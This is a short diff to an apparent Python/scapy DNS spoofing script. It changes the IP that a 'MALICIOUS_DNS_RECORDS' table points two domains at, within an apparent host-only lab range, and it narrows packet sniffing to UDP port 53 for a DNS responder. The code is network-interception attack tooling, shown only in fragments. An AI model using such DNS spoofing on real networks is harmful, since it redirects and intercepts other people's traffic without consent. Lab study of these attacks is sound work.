@@ -15,8 +15,8 @@ INTERFACE = conf.iface
 
 # Malicious DNS records
 MALICIOUS_DNS_RECORDS = {
-    "poop.com.": "192.168.56.12", 
-    "httpforever.com.": "192.168.56.12"
+    "poop.com.": "192.168.56.15", 
+    "httpforever.com.": "192.168.56.15"
 }
 
 stop_thread = threading.Event()
@@ -123,7 +123,7 @@ def main():
                 print(f"Host IP: {ip}, MAC: {mac}")
 
         # Sniff DHCP packets and apply interception, and also handle DNS responses
-        sniff(prn=dns_responder, iface=INTERFACE)
+        sniff(filter="udp port 53", prn=dns_responder, iface=INTERFACE)
     except Exception as e:
         print(f"An error occurred: {e}")
     
